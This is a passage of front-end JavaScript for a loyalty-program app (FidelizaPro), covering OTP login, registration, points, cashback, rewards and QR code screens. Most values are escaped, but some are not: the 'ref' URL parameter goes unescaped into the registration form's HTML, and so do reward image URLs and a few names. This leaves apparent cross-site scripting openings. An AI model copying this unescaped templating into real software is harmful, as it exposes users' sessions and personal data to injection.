    const tick = () => {
        if (restante <= 0) {
            btn.disabled = false;
            btn.textContent = textoOriginal;
            btn.classList.remove('text-slate-400', 'cursor-not-allowed');
            btn.classList.add('text-emerald-600', 'hover:underline');
            return;
        }
        btn.textContent = `Reenviar em ${restante}s`;
        restante--;
        setTimeout(tick, 1000);
    };
    tick();
}

window.validarOtp = async () => {
    const tel = $('#otp-tel').value.trim();
    const codigo = $('#otp-codigo').value.trim();
    if (codigo.length !== 6) return toast('Código deve ter 6 dígitos', 'error');
    try {
        const res = await api('/auth/otp/validar', {
            method: 'POST',
            body: JSON.stringify({ telefone: tel, codigo, empresa_slug: STATE.empresa.slug }),
        });
        STATE.token = res.token;
        STATE.cliente = res.cliente;
        STATE.empresa = res.empresa;
        persistir();
        aplicarTemaEmpresa();
        toast('Bem-vindo de volta!', 'success');
        showScreen(res.cliente.senha_temporaria ? 'trocarSenha' : 'home');
    } catch (e) { toast(e.message, 'error'); }
};

window.resetOtp = () => {
    $('#otp-fase-1').classList.remove('hidden');
    $('#otp-fase-2').classList.add('hidden');
    $('#otp-codigo').value = '';
    $('#otp-dev').textContent = '';
};

// Tela 2: Registrar
async function telaRegistrar() {
    const e = STATE.empresa;
    const cor = e?.cor_primaria || '#6366f1';
    const corSec = e?.cor_secundaria || '#8b5cf6';
    const params = new URLSearchParams(location.search);
    const ref = params.get('ref') || '';
    screenContainer.innerHTML = `
    <div class="fade-in flex-1 flex flex-col">
        <div class="p-6 pb-8 text-white" style="background:linear-gradient(135deg,${cor},${corSec})">
            <button onclick="showScreen('login')" class="text-white/80 mb-3 flex items-center gap-1 text-sm hover:text-white transition">
                <i class="ri-arrow-left-line"></i> Voltar
            </button>
            <h1 class="text-2xl font-bold">Criar conta</h1>
            <p class="text-white/80 text-sm">${e?.nome || 'FidelizaPro'}</p>
        </div>
        <form id="form-reg" class="p-6 -mt-4 bg-white rounded-t-3xl space-y-5 flex-1 overflow-y-auto">

            <div class="space-y-4">
                <div>
                    <label class="block text-sm font-medium text-slate-700 mb-1.5">Nome completo <span class="text-rose-500">*</span></label>
                    <div class="relative">
                        <i class="ri-user-line absolute left-3.5 top-1/2 -translate-y-1/2 text-slate-400"></i>
                        <input name="nome" required placeholder="Como você quer ser chamado"
                               class="w-full pl-11 pr-4 py-3 bg-slate-50 border border-slate-200 rounded-xl focus:bg-white focus:border-slate-400 focus:outline-none transition">
                    </div>
                </div>

                <div>
                    <label class="block text-sm font-medium text-slate-700 mb-1.5">Telefone <span class="text-rose-500">*</span></label>
                    <div class="relative">
                        <i class="ri-smartphone-line absolute left-3.5 top-1/2 -translate-y-1/2 text-slate-400"></i>
                        <input name="telefone" required inputmode="numeric" placeholder="(11) 99999-9999"
                               class="w-full pl-11 pr-4 py-3 bg-slate-50 border border-slate-200 rounded-xl focus:bg-white focus:border-slate-400 focus:outline-none transition">
                    </div>
                    <p class="text-xs text-slate-500 mt-1 ml-1">Usado para login e notificações</p>
                </div>

                <div>
                    <label class="block text-sm font-medium text-slate-700 mb-1.5">CPF <span class="text-rose-500">*</span></label>
                    <div class="relative">
                        <i class="ri-id-card-line absolute left-3.5 top-1/2 -translate-y-1/2 text-slate-400"></i>
                        <input name="cpf" required inputmode="numeric" placeholder="000.000.000-00" maxlength="14"
                               class="w-full pl-11 pr-4 py-3 bg-slate-50 border border-slate-200 rounded-xl focus:bg-white focus:border-slate-400 focus:outline-none transition">
                    </div>
                </div>

                <div>
                    <label class="block text-sm font-medium text-slate-700 mb-1.5">Senha <span class="text-rose-500">*</span></label>
                    <div class="relative">
                        <i class="ri-lock-2-line absolute left-3.5 top-1/2 -translate-y-1/2 text-slate-400"></i>
                        <input name="password" type="password" required minlength="6" placeholder="Mínimo 6 caracteres"
                               class="w-full pl-11 pr-4 py-3 bg-slate-50 border border-slate-200 rounded-xl focus:bg-white focus:border-slate-400 focus:outline-none transition">
                    </div>
                </div>
            </div>

            <div class="pt-4 border-t border-slate-100">
                <p class="text-xs font-semibold text-slate-400 uppercase tracking-wider mb-4">Informações adicionais</p>

                <div class="space-y-4">
                    <div>
                        <label class="block text-sm font-medium text-slate-700 mb-1.5">E-mail</label>
                        <div class="relative">
                            <i class="ri-mail-line absolute left-3.5 top-1/2 -translate-y-1/2 text-slate-400"></i>
                            <input name="email" type="email" placeholder="seu@email.com"
                                   class="w-full pl-11 pr-4 py-3 bg-slate-50 border border-slate-200 rounded-xl focus:bg-white focus:border-slate-400 focus:outline-none transition">
                        </div>
                    </div>

                    <div>
                        <label class="block text-sm font-medium text-slate-700 mb-1.5">Data de nascimento</label>
                        <div class="relative">
                            <i class="ri-cake-2-line absolute left-3.5 top-1/2 -translate-y-1/2 text-slate-400 z-10"></i>
                            <input name="data_nascimento" type="date"
                                   class="w-full pl-11 pr-4 py-3 bg-slate-50 border border-slate-200 rounded-xl focus:bg-white focus:border-slate-400 focus:outline-none transition text-slate-700">
                        </div>
                        <p class="text-xs text-slate-500 mt-1 ml-1">Receba um presente no seu aniversário</p>
                    </div>

                    <div>
                        <label class="block text-sm font-medium text-slate-700 mb-1.5">Código de indicação</label>
                        <div class="relative">
                            <i class="ri-gift-2-line absolute left-3.5 top-1/2 -translate-y-1/2 text-slate-400"></i>
                            <input name="codigo_indicacao" value="${ref}" placeholder="Quem te indicou?"
                                   class="w-full pl-11 pr-4 py-3 bg-slate-50 border border-slate-200 rounded-xl focus:bg-white focus:border-slate-400 focus:outline-none transition">
                        </div>
                    </div>
                </div>
            </div>

            <button type="submit" class="w-full py-3.5 text-white rounded-xl font-semibold shadow-md hover:shadow-xl transition mt-2 flex items-center justify-center gap-2"
                    style="background:linear-gradient(135deg,${cor},${corSec})">
                Criar minha conta <i class="ri-arrow-right-line"></i>
            </button>

            <p class="text-center text-xs text-slate-400 leading-relaxed pb-2">
                Ao criar conta, você concorda em receber<br>comunicações sobre o programa de fidelidade.
            </p>
        </form>
    </div>`;
    $('#form-reg').addEventListener('submit', async (ev) => {
        ev.preventDefault();
        const fd = Object.fromEntries(new FormData(ev.target));
        Object.keys(fd).forEach(k => { if (fd[k] === '') delete fd[k]; });

        if (!validarTelefone(fd.telefone)) return toast('Telefone inválido. Use DDD + número (10 ou 11 dígitos).', 'error');
        if (!validarCpf(fd.cpf)) return toast('CPF inválido. Verifique os dígitos.', 'error');

        const btn = ev.target.querySelector('button[type="submit"]');
        const labelOriginal = btn.innerHTML;
        btn.disabled = true;
        btn.innerHTML = '<i class="ri-loader-4-line animate-spin"></i> Criando conta...';
        try {
            const res = await api('/auth/registrar', {
                method: 'POST',
                body: JSON.stringify({ ...fd, empresa_slug: STATE.empresa.slug }),
            });
            STATE.token = res.token; STATE.cliente = res.cliente; STATE.empresa = res.empresa;
            persistir(); aplicarTemaEmpresa();
            toast('Cadastro realizado!', 'success');
            showScreen('home');
        } catch (e) {
            toast(e.message, 'error');
            btn.disabled = false;
            btn.innerHTML = labelOriginal;
        }
    });
}

// Tela 3: HOME
async function telaHome() {
    const [data, roleta, sorteiosData] = await Promise.all([
        api('/cliente/dashboard'),
        api('/cliente/roleta/status').catch(() => ({ ativa: false })),
        api('/cliente/sorteios').catch(() => ({ sorteios: [], total_bilhetes_ativos: 0 })),
    ]);
    Object.assign(STATE.cliente, { pontos_atual: data.pontos, cashback_atual: data.cashback });
    persistir();
    const c = STATE.cliente, e = STATE.empresa;
    const cor = e.cor_primaria, corSec = e.cor_secundaria;
    screenContainer.innerHTML = `
    <div class="fade-in flex-1 flex flex-col overflow-y-auto bg-slate-50">
        <div class="px-5 pt-6 pb-6 text-white" style="background:linear-gradient(135deg,${cor},${corSec})">
            <div class="flex items-center justify-between">
                <div>
                    <p class="text-white/70 text-xs uppercase tracking-wider">Olá,</p>
                    <h1 class="text-2xl font-bold mt-0.5">${esc(String(c.nome || '').split(' ')[0])} 👋</h1>
                </div>
                <button onclick="showScreen('perfil')" class="w-11 h-11 rounded-full bg-white/20 backdrop-blur flex items-center justify-center font-bold text-lg hover:bg-white/30 transition overflow-hidden">
                    ${c.foto
                        ? `<img src="${escAttr(c.foto)}" class="w-full h-full object-cover" alt="">`
                        : esc(String(c.nome || '').charAt(0).toUpperCase())}
                </button>
            </div>

            <div class="mt-5 bg-white/15 backdrop-blur rounded-2xl border border-white/20 p-4">
                <div class="grid grid-cols-2 gap-3 pb-3 border-b border-white/20">
                    <div>
                        <p class="text-[11px] text-white/70 uppercase tracking-wider flex items-center gap-1">
                            <i class="ri-coin-line"></i> Pontos
                        </p>
                        <p class="text-2xl font-bold mt-1">${fmtNum(data.pontos)}</p>
                    </div>
                    <div>
                        <p class="text-[11px] text-white/70 uppercase tracking-wider flex items-center gap-1">
                            <i class="ri-money-dollar-circle-line"></i> Cashback
                        </p>
                        <p class="text-2xl font-bold mt-1">${fmtBRL(data.cashback)}</p>
                        ${data.cashback_pendente > 0 ? `<p class="text-[10px] text-white/70 mt-0.5"><i class="ri-time-line"></i> ${fmtBRL(data.cashback_pendente)} liberando</p>` : ''}
                    </div>
                </div>
                <button onclick="showScreen('qrcode')"
                        class="w-full py-2.5 mt-3 rounded-xl bg-white font-semibold flex items-center justify-center gap-2 hover:bg-white/90 transition"
                        style="color:${cor}">
                    <i class="ri-qr-code-line text-xl"></i> Mostrar meu QR Code
                </button>
            </div>
        </div>

        ${roleta.ativa && roleta.pode_girar ? `
        <div class="px-4 -mt-3">
            <button onclick="showScreen('roleta')" class="w-full text-left rounded-2xl p-4 text-white shadow-xl relative overflow-hidden transition active:scale-[0.99]"
                    style="background:linear-gradient(135deg,#f59e0b,#ef4444 50%,#a855f7);">
                <span class="absolute -right-6 -top-6 w-24 h-24 rounded-full bg-white/20 animate-pulse"></span>
                <span class="absolute right-3 top-3 bg-white text-rose-600 text-[10px] font-bold rounded-full px-2 py-0.5 shadow">${roleta.giros_disponiveis} ${roleta.giros_disponiveis === 1 ? 'giro' : 'giros'}</span>
                <div class="flex items-center gap-3 relative">
                    <div class="w-12 h-12 rounded-xl bg-white/25 backdrop-blur flex items-center justify-center text-white drop-shadow">
                        <svg viewBox="0 0 24 24" class="w-8 h-8">
                            <path d="M12 0 L10 3.5 L14 3.5 Z" fill="currentColor"/>
                            <g transform="translate(12, 13)">
                                <path d="M0,0 L0,-9 A9,9 0 0,1 6.36,-6.36 Z" fill="currentColor"/>
                                <path d="M0,0 L6.36,-6.36 A9,9 0 0,1 9,0 Z" fill="currentColor" opacity="0.4"/>
                                <path d="M0,0 L9,0 A9,9 0 0,1 6.36,6.36 Z" fill="currentColor"/>
                                <path d="M0,0 L6.36,6.36 A9,9 0 0,1 0,9 Z" fill="currentColor" opacity="0.4"/>
                                <path d="M0,0 L0,9 A9,9 0 0,1 -6.36,6.36 Z" fill="currentColor"/>
                                <path d="M0,0 L-6.36,6.36 A9,9 0 0,1 -9,0 Z" fill="currentColor" opacity="0.4"/>
                                <path d="M0,0 L-9,0 A9,9 0 0,1 -6.36,-6.36 Z" fill="currentColor"/>
                                <path d="M0,0 L-6.36,-6.36 A9,9 0 0,1 0,-9 Z" fill="currentColor" opacity="0.4"/>
                                <circle r="1.5" fill="white"/>
                            </g>
                        </svg>
                    </div>
                    <div>
                        <p class="font-bold text-lg leading-tight">Você tem giros na roleta!</p>
                        <p class="text-xs text-white/90">Toque pra girar e ganhar prêmios</p>
                    </div>
                </div>
            </button>
        </div>` : roleta.ativa ? `
        <div class="px-4 -mt-3">
            <button onclick="showScreen('roleta')" class="w-full text-left rounded-2xl p-3 bg-white border border-slate-200 transition active:scale-[0.99]">
                <div class="flex items-center gap-3">
                    <div class="w-10 h-10 rounded-xl flex items-center justify-center" style="background:${cor}15;color:${cor}">
                        <svg viewBox="0 0 24 24" class="w-6 h-6">
                            <path d="M12 0 L10 3.5 L14 3.5 Z" fill="currentColor"/>
                            <g transform="translate(12, 13)">
                                <path d="M0,0 L0,-9 A9,9 0 0,1 6.36,-6.36 Z" fill="currentColor"/>
                                <path d="M0,0 L6.36,-6.36 A9,9 0 0,1 9,0 Z" fill="currentColor" opacity="0.45"/>
                                <path d="M0,0 L9,0 A9,9 0 0,1 6.36,6.36 Z" fill="currentColor"/>
                                <path d="M0,0 L6.36,6.36 A9,9 0 0,1 0,9 Z" fill="currentColor" opacity="0.45"/>
                                <path d="M0,0 L0,9 A9,9 0 0,1 -6.36,6.36 Z" fill="currentColor"/>
                                <path d="M0,0 L-6.36,6.36 A9,9 0 0,1 -9,0 Z" fill="currentColor" opacity="0.45"/>
                                <path d="M0,0 L-9,0 A9,9 0 0,1 -6.36,-6.36 Z" fill="currentColor"/>
                                <path d="M0,0 L-6.36,-6.36 A9,9 0 0,1 0,-9 Z" fill="currentColor" opacity="0.45"/>
                                <circle r="1.3" fill="white"/>
                            </g>
                        </svg>
                    </div>
                    <div class="flex-1 min-w-0">
                        <p class="font-semibold text-slate-700">${roleta.nome || 'Roleta da sorte'}</p>
                        <p class="text-xs text-slate-400">Compre e ganhe giros</p>
                    </div>
                    <i class="ri-arrow-right-s-line text-slate-300 text-xl"></i>
                </div>
            </button>
        </div>` : ''}

        ${(() => {
            const lista          = sorteiosData.sorteios || [];
            const temBilhetes    = sorteiosData.total_bilhetes_ativos > 0;
            const sorteioAtivo   = lista.find(s => s.status === 'ativo');
            const venceu         = lista.find(s => s.eu_venci);
            const sortidoComBilh = lista.find(s => s.status === 'sorteado' && s.meus_bilhetes > 0 && !s.eu_venci);
            const temHistorico   = sorteiosData.tem_historico;

            if (!temBilhetes && !sorteioAtivo && !venceu && !sortidoComBilh && !temHistorico) return '';

            let icone = '🎟️', titulo, sub, cor = 'border-amber-200';
            if (venceu) {
                icone = '🏆'; cor = 'border-amber-400 bg-amber-50';
                titulo = `Você venceu "${venceu.nome}"!`;
                sub = 'Toque pra ver o resultado';
            } else if (temBilhetes) {
                titulo = `Você tem ${sorteiosData.total_bilhetes_ativos} ${sorteiosData.total_bilhetes_ativos === 1 ? 'bilhete' : 'bilhetes'} ativos`;
                sub = 'Toque pra ver os sorteios';
            } else if (sorteioAtivo) {
                titulo = `Sorteio "${sorteioAtivo.nome}" tá rolando!`;
                sub = 'Gire a roleta pra ganhar bilhetes';
            } else if (sortidoComBilh) {
                titulo = `Resultado de "${sortidoComBilh.nome}" saiu`;
                sub = 'Toque pra ver';
            } else {
                icone = '<i class="ri-history-fill text-slate-500"></i>'; cor = 'border-slate-200';
                titulo = 'Sorteios passados';
                sub = 'Toque pra ver seu histórico';
            }
            return `
            <div class="px-4 mt-3">
                <button onclick="showScreen('sorteios')" class="w-full text-left rounded-2xl p-4 bg-white border ${cor} shadow-sm transition active:scale-[0.99]">
                    <div class="flex items-center gap-3">
                        <div class="w-12 h-12 rounded-xl bg-amber-50 flex items-center justify-center text-2xl">${icone}</div>
                        <div class="flex-1 min-w-0">
                            <p class="font-bold text-slate-800">${titulo}</p>
                            <p class="text-xs text-slate-500">${sub}</p>
                        </div>
                        <i class="ri-arrow-right-s-line text-slate-300 text-xl"></i>
                    </div>
                </button>
            </div>`;
        })()}

        <div class="p-4 mt-2">
            <h3 class="text-xs text-slate-500 uppercase tracking-wider font-semibold mb-3 px-1">Acessar</h3>
            <div class="grid grid-cols-3 gap-3">
                <button onclick="showScreen('catalogo')" class="bg-white border border-slate-200 rounded-2xl p-4 flex flex-col items-center gap-2 hover:shadow-md hover:border-slate-300 transition">
                    <div class="w-11 h-11 rounded-xl flex items-center justify-center" style="background:${cor}15">
                        <i class="ri-gift-line text-2xl" style="color:${cor}"></i>
                    </div>
                    <p class="text-sm font-semibold text-slate-700">Prêmios</p>
                </button>
                <button onclick="showScreen('compras')" class="bg-white border border-slate-200 rounded-2xl p-4 flex flex-col items-center gap-2 hover:shadow-md hover:border-slate-300 transition">
                    <div class="w-11 h-11 rounded-xl bg-amber-50 flex items-center justify-center">
                        <i class="ri-shopping-bag-line text-2xl text-amber-600"></i>
                    </div>
                    <p class="text-sm font-semibold text-slate-700">Compras</p>
                </button>
                <button onclick="showScreen('parceiros')" class="bg-white border border-slate-200 rounded-2xl p-4 flex flex-col items-center gap-2 hover:shadow-md hover:border-slate-300 transition">
                    <div class="w-11 h-11 rounded-xl bg-purple-50 flex items-center justify-center">
                        <i class="ri-shake-hands-line text-2xl text-purple-600"></i>
                    </div>
                    <p class="text-sm font-semibold text-slate-700">Parceiros</p>
                </button>
                <button onclick="showScreen('indicacoes')" class="bg-white border border-slate-200 rounded-2xl p-4 flex flex-col items-center gap-2 hover:shadow-md hover:border-slate-300 transition">
                    <div class="w-11 h-11 rounded-xl bg-emerald-50 flex items-center justify-center">
                        <i class="ri-share-line text-2xl text-emerald-600"></i>
                    </div>
                    <p class="text-sm font-semibold text-slate-700">Indicar</p>
                </button>
                <button onclick="showScreen('pesquisa')" class="bg-white border border-slate-200 rounded-2xl p-4 flex flex-col items-center gap-2 hover:shadow-md hover:border-slate-300 transition">
                    <div class="w-11 h-11 rounded-xl bg-pink-50 flex items-center justify-center">
                        <i class="ri-emotion-happy-line text-2xl text-pink-600"></i>
                    </div>
                    <p class="text-sm font-semibold text-slate-700">Avaliar</p>
                </button>
                <button onclick="showScreen('meusCupons')" class="bg-white border border-slate-200 rounded-2xl p-4 flex flex-col items-center gap-2 hover:shadow-md hover:border-slate-300 transition">
                    <div class="w-11 h-11 rounded-xl bg-indigo-50 flex items-center justify-center">
                        <i class="ri-coupon-3-line text-2xl text-indigo-600"></i>
                    </div>
                    <p class="text-sm font-semibold text-slate-700">Cupons</p>
                </button>
            </div>
        </div>

        <div class="px-4 pb-6">
            <h3 class="text-xs text-slate-500 uppercase tracking-wider font-semibold mb-3 px-1">Resumo</h3>
            <div class="grid grid-cols-2 gap-3">
                <div class="bg-white rounded-2xl p-4 border border-slate-200">
                    <div class="w-9 h-9 rounded-lg bg-emerald-50 flex items-center justify-center mb-2">
                        <i class="ri-wallet-3-line text-emerald-600"></i>
                    </div>
                    <p class="text-xs text-slate-500">Total gasto</p>
                    <p class="text-lg font-bold text-slate-800">${fmtBRL(data.total_gasto)}</p>
                </div>
                <div class="bg-white rounded-2xl p-4 border border-slate-200">
                    <div class="w-9 h-9 rounded-lg bg-amber-50 flex items-center justify-center mb-2">
                        <i class="ri-shopping-cart-line text-amber-600"></i>
                    </div>
                    <p class="text-xs text-slate-500">Compras</p>
                    <p class="text-lg font-bold text-slate-800">${data.total_compras || 0}</p>
                </div>
            </div>
        </div>
    </div>`;
}

// Tela 4: Compras
async function telaCompras() {
    const data = await api('/cliente/compras');
    const e = STATE.empresa;
    const totalGasto = data.compras.reduce((s, c) => s + Number(c.valor || 0), 0);
    const totalPontos = data.compras.reduce((s, c) => s + Number(c.pontos_gerados || 0), 0);
    screenContainer.innerHTML = `
    <div class="fade-in flex-1 flex flex-col overflow-y-auto bg-slate-50">
        <div class="px-5 pt-6 pb-10 text-white" style="background:linear-gradient(135deg,${e.cor_primaria},${e.cor_secundaria})">
            <h1 class="text-2xl font-bold">Minhas compras</h1>
            <p class="text-white/80 text-sm">${data.compras.length} ${data.compras.length === 1 ? 'registro' : 'registros'}</p>
        </div>

        ${data.compras.length > 0 ? `
        <div class="px-4 -mt-6">
            <div class="grid grid-cols-2 gap-3">
                <div class="bg-white rounded-2xl p-4 border border-slate-200 shadow-sm">
                    <p class="text-xs text-slate-500 uppercase tracking-wider">Total gasto</p>
                    <p class="text-xl font-bold text-emerald-600 mt-1">${fmtBRL(totalGasto)}</p>
                </div>
                <div class="bg-white rounded-2xl p-4 border border-slate-200 shadow-sm">
                    <p class="text-xs text-slate-500 uppercase tracking-wider">Pontos ganhos</p>
                    <p class="text-xl font-bold text-amber-600 mt-1">${fmtNum(totalPontos)}</p>
                </div>
            </div>
        </div>` : ''}

        <div class="p-4 space-y-2 mt-2">
            ${data.compras.length === 0 ? `
                <div class="text-center py-12">
                    <div class="w-16 h-16 mx-auto rounded-full bg-slate-100 flex items-center justify-center mb-3">
                        <i class="ri-shopping-bag-line text-3xl text-slate-400"></i>
                    </div>
                    <p class="text-slate-500 font-medium">Nenhuma compra ainda</p>
                    <p class="text-sm text-slate-400 mt-1">Suas compras aparecerão aqui</p>
                </div>
            ` : ''}
            ${data.compras.map(c => `
                <div class="bg-white border border-slate-200 rounded-2xl p-4 flex items-start gap-3">
                    <div class="w-10 h-10 rounded-xl bg-emerald-50 flex items-center justify-center flex-shrink-0">
                        <i class="ri-shopping-bag-line text-emerald-600"></i>
                    </div>
                    <div class="flex-1 min-w-0">
                        <p class="font-semibold text-slate-800 truncate">${esc(c.descricao || 'Compra')}</p>
                        <p class="text-xs text-slate-500 mt-0.5">${esc(c.data_formatada)}</p>
                        <div class="flex flex-wrap gap-x-3 gap-y-1 mt-2">
                            <span class="text-xs text-amber-700 bg-amber-50 px-2 py-0.5 rounded-full">
                                <i class="ri-coin-line"></i> +${fmtNum(c.pontos_gerados)} pts
                            </span>
                            ${c.cashback_gerado > 0 ? `
                                <span class="text-xs text-teal-700 bg-teal-50 px-2 py-0.5 rounded-full">
                                    <i class="ri-money-dollar-circle-line"></i> +${fmtBRL(c.cashback_gerado)}
                                </span>
                            ` : ''}
                        </div>
                    </div>
                    <p class="font-bold text-slate-800 whitespace-nowrap">${fmtBRL(c.valor)}</p>
                </div>
            `).join('')}
        </div>
    </div>`;
}

// Tela 5: Catálogo recompensas
async function telaCatalogo() {
    const data = await api('/recompensas');
    const e = STATE.empresa;
    const cor = e.cor_primaria, corSec = e.cor_secundaria;
    screenContainer.innerHTML = `
    <div class="fade-in flex-1 flex flex-col overflow-y-auto bg-slate-50">
        <div class="px-5 pt-6 pb-10 text-white" style="background:linear-gradient(135deg,${cor},${corSec})">
            <h1 class="text-2xl font-bold">Prêmios</h1>
            <p class="text-white/80 text-sm">Troque seus pontos por recompensas</p>
        </div>

        <div class="px-4 -mt-6">
            <div class="bg-white rounded-2xl p-4 border border-slate-100 shadow-md flex items-center gap-3">
                <div class="w-12 h-12 rounded-xl flex items-center justify-center" style="background:${cor}15">
                    <i class="ri-coin-line text-2xl" style="color:${cor}"></i>
                </div>
                <div class="flex-1">
                    <p class="text-xs text-slate-500 uppercase tracking-wider">Saldo disponível</p>
                    <p class="text-2xl font-bold text-slate-800">${fmtNum(STATE.cliente.pontos_atual)} <span class="text-sm text-slate-500 font-normal">pontos</span></p>
                </div>
            </div>
        </div>

        <div class="p-4 mt-2">
            ${data.recompensas.length === 0 ? `
                <div class="text-center py-12">
                    <div class="w-16 h-16 mx-auto rounded-full bg-slate-100 flex items-center justify-center mb-3">
                        <i class="ri-gift-line text-3xl text-slate-400"></i>
                    </div>
                    <p class="text-slate-500 font-medium">Nenhuma recompensa cadastrada</p>
                </div>
            ` : `
            <div class="grid grid-cols-2 gap-3">
                ${data.recompensas.map(r => `
                    <div class="bg-white border border-slate-200 rounded-2xl overflow-hidden ${!r.pode_resgatar ? 'opacity-60' : ''} hover:shadow-md transition">
                        <div class="aspect-square flex items-center justify-center text-white text-5xl relative"
                             style="background:linear-gradient(135deg,${cor},${corSec})">
                            ${r.imagem ? `<img src="${r.imagem}" class="w-full h-full object-cover">` : '<i class="ri-gift-line"></i>'}
                            ${!r.pode_resgatar ? `
                                <div class="absolute top-2 right-2 bg-black/40 backdrop-blur text-white text-[10px] px-2 py-0.5 rounded-full">
                                    Faltam ${fmtNum(r.custo_pontos - STATE.cliente.pontos_atual)} pts
                                </div>
                            ` : ''}
                        </div>
                        <div class="p-3">
                            <p class="font-semibold text-sm text-slate-800 line-clamp-2 min-h-[2.5em]">${esc(r.nome)}</p>
                            <p class="font-bold text-sm mt-2 flex items-center gap-1" style="color:${escAttr(cor)}">
                                <i class="ri-coin-line"></i> ${fmtNum(r.custo_pontos)} pts
                            </p>
                            <button data-resgate-id="${Number(r.id)}" data-resgate-nome="${escAttr(r.nome)}" data-resgate-custo="${Number(r.custo_pontos)}"
                                    onclick="solicitarResgate(this.dataset.resgateId, this.dataset.resgateNome, this.dataset.resgateCusto)"
                                    ${!r.pode_resgatar ? 'disabled' : ''}
                                    class="mt-3 w-full text-xs font-semibold py-2 text-white rounded-lg disabled:bg-slate-200 disabled:text-slate-400 transition"
                                    style="${r.pode_resgatar ? `background:linear-gradient(135deg,${cor},${corSec})` : ''}">
                                ${r.pode_resgatar ? 'Resgatar' : 'Indisponível'}
                            </button>
                        </div>
                    </div>
                `).join('')}
            </div>`}
        </div>
    </div>`;
}

window.solicitarResgate = async (id, nome, custo) => {
    const ok = await confirmar({
        titulo: 'Resgatar prêmio',
        mensagem: `Trocar ${fmtNum(custo)} pontos por "${nome}"?`,
        ok: 'Resgatar',
        icone: 'ri-gift-line',
    });
    if (!ok) return;
    try {
        const res = await api('/resgates', { method: 'POST', body: JSON.stringify({ recompensa_id: id }) });
        STATE.cliente.pontos_atual = res.novo_saldo_pontos;
        persistir();
        toast(`Resgate solicitado! Código: ${res.resgate.codigo}`, 'success');
        setTimeout(() => showScreen('resgates'), 800);
    } catch (e) { toast(e.message, 'error'); }
};

// Tela 6: QR Code
async function telaQrCode() {
    const codigo = encodeURIComponent(STATE.cliente.codigo_qr);
    const e = STATE.empresa;
    screenContainer.innerHTML = `
    <div class="fade-in flex-1 flex flex-col overflow-y-auto bg-slate-50">
        <div class="px-5 pt-6 pb-12 text-white text-center" style="background:linear-gradient(135deg,${e.cor_primaria},${e.cor_secundaria})">
            <h1 class="text-2xl font-bold">Meu QR Code</h1>
            <p class="text-white/80 text-sm mt-1">Apresente no caixa para acumular pontos</p>
        </div>

        <div class="px-4 -mt-8 pb-6">
            <div class="bg-white rounded-3xl shadow-xl border border-slate-100 p-6 text-center">
                <div class="bg-white p-3 rounded-2xl border-2 border-slate-100 inline-block">
                    <img src="${API}/qr/${codigo}" width="240" height="240" alt="QR Code" class="block">
                </div>
                <p class="mt-4 font-mono text-base font-semibold text-slate-700 tracking-wider">${STATE.cliente.codigo_qr}</p>
                <div class="mt-4 pt-4 border-t border-slate-100">
                    <p class="font-semibold text-slate-800">${STATE.cliente.nome}</p>
                    <p class="text-sm text-slate-500">${STATE.cliente.telefone}</p>
                </div>
            </div>

            <div class="mt-4 bg-amber-50 border border-amber-100 rounded-2xl p-4 flex gap-3">
                <i class="ri-information-line text-amber-600 text-xl flex-shrink-0"></i>
                <div>
                    <p class="text-sm font-semibold text-amber-900">Como usar</p>
                    <p class="text-xs text-amber-800 mt-1">Mostre este código ao atendente para acumular pontos a cada compra.</p>
                </div>
            </div>
        </div>
    </div>`;
}

// Tela 7: Perfil
async function telaPerfil() {
    const c = STATE.cliente;
    const e = STATE.empresa;
    screenContainer.innerHTML = `
    <div class="fade-in flex-1 flex flex-col overflow-y-auto bg-slate-50">
        <div class="px-5 pt-8 pb-12 text-white text-center" style="background:linear-gradient(135deg,${e.cor_primaria},${e.cor_secundaria})">
            <div class="w-24 h-24 mx-auto rounded-full bg-white/20 backdrop-blur border-4 border-white/30 flex items-center justify-center text-4xl font-bold shadow-lg overflow-hidden">
                ${c.foto
                    ? `<img src="${escAttr(c.foto)}" class="w-full h-full object-cover" alt="">`
                    : esc(String(c.nome || '').charAt(0).toUpperCase())}
            </div>
            <h1 class="text-2xl font-bold mt-4">${esc(c.nome)}</h1>
            <p class="text-white/80 text-sm">${esc(c.telefone)}</p>
            ${c.email ? `<p class="text-white/70 text-xs mt-1">${esc(c.email)}</p>` : ''}
        </div>

        <div class="px-4 -mt-8">
            <div class="bg-white rounded-2xl shadow-md border border-slate-100 p-4 grid grid-cols-3 gap-2 text-center">
                <div>
                    <p class="text-lg font-bold text-slate-800">${fmtNum(c.pontos_atual || 0)}</p>
                    <p class="text-[10px] text-slate-500 uppercase tracking-wider">Pontos</p>
                </div>
                <div class="border-x border-slate-100">
                    <p class="text-lg font-bold text-emerald-600">${fmtBRL(c.cashback_atual || 0)}</p>
                    <p class="text-[10px] text-slate-500 uppercase tracking-wider">Cashback</p>
                </div>
                <div>
                    <p class="text-lg font-bold text-slate-800">${c.total_compras || 0}</p>
                    <p class="text-[10px] text-slate-500 uppercase tracking-wider">Compras</p>
                </div>
            </div>
        </div>

        <div class="px-4 mt-4">
            <h3 class="text-xs text-slate-500 uppercase tracking-wider font-semibold mb-2 px-1">Minha conta</h3>
            <div class="bg-white rounded-2xl border border-slate-200 overflow-hidden divide-y divide-slate-100">
                <button onclick="showScreen('extrato')" class="w-full p-4 flex items-center gap-3 hover:bg-slate-50 transition">
                    <div class="w-9 h-9 rounded-lg bg-blue-50 flex items-center justify-center">
                        <i class="ri-bank-line text-blue-600"></i>
                    </div>
                    <span class="flex-1 text-left font-medium text-slate-700">Extrato</span>
                    <i class="ri-arrow-right-s-line text-slate-400 text-xl"></i>
                </button>
                <button onclick="showScreen('empresa')" class="w-full p-4 flex items-center gap-3 hover:bg-slate-50 transition">
                    <div class="w-9 h-9 rounded-lg bg-purple-50 flex items-center justify-center">
                        <i class="ri-store-2-line text-purple-600"></i>
                    </div>
                    <span class="flex-1 text-left font-medium text-slate-700">Sobre a empresa</span>
                    <i class="ri-arrow-right-s-line text-slate-400 text-xl"></i>
                </button>
                <button onclick="showScreen('resgates')" class="w-full p-4 flex items-center gap-3 hover:bg-slate-50 transition">
                    <div class="w-9 h-9 rounded-lg bg-amber-50 flex items-center justify-center">
                        <i class="ri-coupon-line text-amber-600"></i>
                    </div>
                    <span class="flex-1 text-left font-medium text-slate-700">Meus resgates</span>
                    <i class="ri-arrow-right-s-line text-slate-400 text-xl"></i>
                </button>
                <button onclick="showScreen('meusCupons')" class="w-full p-4 flex items-center gap-3 hover:bg-slate-50 transition">
                    <div class="w-9 h-9 rounded-lg bg-indigo-50 flex items-center justify-center">
                        <i class="ri-coupon-3-line text-indigo-600"></i>
                    </div>
                    <span class="flex-1 text-left font-medium text-slate-700">Meus cupons</span>
